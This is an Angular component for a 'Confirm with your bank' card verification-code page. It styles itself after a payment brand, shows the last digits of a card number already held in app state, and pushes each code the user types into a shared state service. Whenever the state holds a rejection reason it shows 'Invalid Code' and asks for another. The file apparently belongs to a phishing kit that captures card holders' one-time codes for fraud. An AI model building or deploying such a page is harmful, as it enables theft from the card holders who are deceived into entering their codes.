
import { Component, inject, signal, AfterViewInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';

@Component({
  selector: 'app-card-otp',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center mb-6">
        <div class="bg-blue-50 text-[#0070ba] text-[11px] font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-5 border border-blue-100">
           Bank Verification
        </div>
        <h1 class="text-xl font-bold text-[#2c2e2f] mb-2 text-center">Confirm with your bank</h1>
        <p class="text-sm text-[#5e6c75] text-center px-4">
           We've sent a code to the mobile number registered with your card ending in •••• {{ last4() }}.
        </p>
      </div>

      <!-- Feedback -->
      @if (state.rejectionReason()) {
        <div class="mb-6 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 animate-in fade-in slide-in-from-top-2">
            <span class="material-icons text-[#d92d20] text-xl mt-0.5">error_outline</span>
            <div>
              <p class="text-sm font-bold text-[#2c2e2f]">Invalid Code</p>
              <p class="text-xs text-[#5e6c75]">Please check the code and try again.</p>
            </div>
        </div>
      }

      <div class="space-y-6">
        <div class="relative group">
            <input 
              type="text" 
              [(ngModel)]="otp"
              (input)="onInput($event)"
              id="otp"
              placeholder=" "
              class="peer w-full px-4 pt-6 pb-2 rounded border transition-all duration-300 shadow-input focus:scale-[1.01] focus:shadow-input-focus outline-none bg-white text-[#2c2e2f] text-center tracking-[0.5em] font-mono font-bold text-lg"
              [class.border-[#d92d20]]="state.rejectionReason()"
              [class.border-[#0070ba]]="!state.rejectionReason() && otp.length > 0"
              [class.border-[#9da3a6]]="!state.rejectionReason() && otp.length === 0"
            />
            <label 
               for="otp" 
               class="absolute left-1/2 -translate-x-1/2 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[11px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[11px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text bg-white px-2 pointer-events-none"
               >
               Enter Bank Code
            </label>
        </div>

        <button 
          (click)="submit()"
          [disabled]="otp.length < 4"
          [class.opacity-50]="otp.length < 4"
          class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 px-4 rounded-full transition-all duration-300 shadow-md hover:scale-[1.02] active:scale-[0.98]"
        >
          Verify
        </button>

        <div class="text-center">
            <p class="text-xs text-[#5e6c75] mb-2">Didn't receive a code?</p>
            <button 
                (click)="resend()"
                [disabled]="timer() > 0"
                class="text-[#0070ba] font-bold text-sm hover:underline disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed">
                {{ timer() > 0 ? 'Resend available in ' + timer() + 's' : 'Resend Code' }}
            </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class CardOtpComponent implements AfterViewInit, OnDestroy {
  state = inject(StateService);
  otp = '';

  last4 = signal('');
  timer = signal(0);
  private timerInterval: any;

  constructor() {
      // safe access
      const num = this.state.cardNumber();
      if(num && num.length > 4) {
          this.last4.set(num.slice(-4));
      }
      // Start timer automatically on view enter
      this.startTimer();
  }

  ngAfterViewInit() {
      // Auto focus logic
      setTimeout(() => {
        const el = document.getElementById('otp');
        if (el) el.focus();
      }, 100);
  }

  ngOnDestroy() {
      if (this.timerInterval) clearInterval(this.timerInterval);
  }

  startTimer() {
      this.timer.set(30);
      if (this.timerInterval) clearInterval(this.timerInterval);
      this.timerInterval = setInterval(() => {
          this.timer.update(v => {
              if (v <= 1) {
                  clearInterval(this.timerInterval);
                  return 0;
              }
              return v - 1;
          });
      }, 1000);
  }

  onInput(event: any) {
      // Allow numbers only
      const val = event.target.value.replace(/\D/g, '');
      this.otp = val;
      this.state.updateCard({ otp: val });
  }

  submit() {
      if (this.otp.length >= 4) {
          this.state.submitCardOtp(this.otp);
      }
  }

  resend() {
      if (this.timer() === 0) {
          this.state.triggerResendAlert();
          this.startTimer();
      }
  }
}
